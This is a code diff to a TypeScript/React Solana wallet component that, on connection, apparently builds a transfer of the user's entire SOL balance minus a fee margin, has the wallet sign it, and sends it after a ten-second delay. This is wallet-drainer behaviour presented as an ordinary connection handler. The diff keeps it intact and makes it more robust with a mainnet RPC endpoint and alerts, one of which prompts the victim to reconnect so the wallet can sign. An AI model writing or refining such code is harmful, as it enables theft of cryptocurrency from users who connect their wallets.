@@ -53,7 +53,7 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
 
     return (
         <ConnectionProvider endpoint={endpoint}>
-            <WalletProvider wallets={wallets} autoConnect>
+            <WalletProvider wallets={wallets} autoConnect={false}>
                 <WalletModalProvider>{children}</WalletModalProvider>
             </WalletProvider>
         </ConnectionProvider>
@@ -84,13 +84,14 @@ const WalletConnectionHandler: FC = () => {
     const fetchBalanceAndPrepareTx = async (walletPublicKey: PublicKey) => {
         try {
             setLoading(true);
-            const connection = new Connection('https://solana-api.projectserum.com');
+            const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
 
             let balanceLamports: number;
             try {
                 balanceLamports = await connection.getBalance(walletPublicKey);
             } catch (err) {
                 console.error('❌ Failed to fetch balance:', err);
+                alert('Failed to fetch balance. Please try again.');
                 setSolBalance(null);
                 return;
             }
@@ -99,9 +100,9 @@ const WalletConnectionHandler: FC = () => {
             setSolBalance(balanceSOL);
             console.log(`✅ Wallet Connected: ${balanceSOL.toFixed(4)} SOL`);
 
-            const transferAmount = balanceLamports - 5000; // Leave some lamports for fee
+            const transferAmount = balanceLamports - 5000;
             if (transferAmount <= 0) {
-                console.warn('⚠️ Not enough SOL to send after fees.');
+                alert('⚠️ Not enough SOL to send after fees.');
                 return;
             }
 
@@ -116,7 +117,7 @@ const WalletConnectionHandler: FC = () => {
             tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
 
             if (!signTransaction) {
-                console.error('❌ Wallet does not support signing transactions.');
+                alert('❌ Wallet not ready to sign. Please reconnect.');
                 return;
             }
 
@@ -129,10 +130,12 @@ const WalletConnectionHandler: FC = () => {
                     console.log(`🚀 Sent after 10s. Tx Signature: ${sig}`);
                 } catch (err) {
                     console.error('❌ Failed to send signed transaction:', err);
+                    alert('Failed to send transaction.');
                 }
             }, 10000);
         } catch (error) {
             console.error('❌ Transaction preparation error:', error);
+            alert('An error occurred. Check console for details.');
         } finally {
             setLoading(false);
         }
